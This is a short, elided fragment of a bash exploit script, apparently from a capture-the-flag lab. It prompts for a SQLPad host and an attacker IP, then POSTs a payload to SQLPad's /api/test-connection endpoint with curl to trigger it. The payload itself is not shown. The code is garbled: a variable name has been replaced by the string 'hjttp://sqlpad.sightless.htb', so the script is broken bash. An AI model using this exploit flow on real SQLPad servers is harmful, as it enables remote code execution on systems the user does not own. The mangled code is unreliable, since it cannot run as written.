...
# Prompt the user for the hjttp://sqlpad.sightless.htb server and attacker's IP address
echo "Please provide the hjttp://sqlpad.sightless.htb host (e.g., x.x.com): "; read hjttp://sqlpad.sightless.htb
...
# Perform the POST request using curl to trigger the payload on the hjttp://sqlpad.sightless.htb server
curl -i -s -k -X POST -H "Host: $hjttp://sqlpad.sightless.htb" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$hjttp://sqlpad.sightless.htb" -H "Referer: http://$hjttp://sqlpad.sightless.htb/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$hjttp://sqlpad.sightless.htb/api/test-connection" > /dev/null
